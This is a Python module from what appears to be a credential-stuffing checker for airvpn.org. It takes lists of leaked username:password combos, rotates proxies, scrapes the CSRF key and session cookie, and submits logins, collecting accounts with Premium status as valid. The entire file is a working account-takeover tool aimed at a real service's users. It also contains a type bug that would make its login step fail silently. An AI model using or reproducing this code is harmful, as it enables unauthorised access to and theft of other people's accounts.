import requests
import json
import re
from utils.values import settings, accounts, Proxies
from utils.utilities import proxy_getter


header = {
    "User-Agent": settings.general.useragent,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://airvpn.org/login/",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "cache-control": "no-cache",
    }

re_csrfKey = r"<input type=\"hidden\" name=\"csrfKey\" value=\"(.*)\">"
re_goodresponse = r"AirVPN"
re_premium = r"Premium"
re_failed = r"The username or password was incorrect"

def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    for x in range(0, int(settings.airvpn.max_errors_per_try1)):
        proxs_list = proxy_getter(__name__)
        try:
            r_one = requests.get(url="https://airvpn.org/login/", headers=header, timeout=settings.airvpn.timeout, proxies=proxs_list[1])
            if len(re.findall(re_goodresponse, r_one.text)) == 0:
                # repeat the requests cause it was a bad request
                continue
            if len(re.findall(re_csrfKey, r_one.text)) != 1:
                continue
            csrfKey = re.findall(re_csrfKey, r_one.text)[0]
            cookie_ips4_IPSSessionFront = {'ips4_IPSSessionFront': requests.utils.dict_from_cookiejar(r_one.cookies)['ips4_IPSSessionFront']}
            login(combo=combo, cookie=cookie_ips4_IPSSessionFront, csrfKey=csrfKey, proxs_list=proxs_list)
            return
        except:
            continue
    accounts.invalid_airvpn.append(f"{username}:{password}")


def login(combo, cookie, csrfKey, proxs_list):
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    body = f"csrfKey={csrfKey}&ref=aHR0cHM6Ly9haXJ2cG4ub3JnL2xvZ2luLw=&auth={username}&password={password}&remember_me=1&_processLogin=usernamepassword"
    proxs_list = proxs_list
    for x in range(0, int(settings.airvpn.max_errors_per_try2)):
        try:
            r_two = requests.post(url="https://airvpn.org/login/", data=body, headers=header, cookies=cookie, timeout=settings.airvpn.timeout, proxies=proxs_list[1])
            if len(re.findall(re_goodresponse, r_two.text)) == 0:
                # repeat the requests cause it was a bad request
                proxs_list = proxy_getter(__name__)
                continue
            if len(re.findall(re_failed, r_two.text)) >= 1:
                # Account is invalid
                break

            if len(re.findall(re_premium, r_two.text)) == 1:
                accounts.valid_airvpn.append(f"{username}:{password}:Premium")
                return
            else:
                break
        except:
            proxs_list = proxy_getter(__name__)
            continue
    accounts.invalid_airvpn.append(f"{username}:{password}")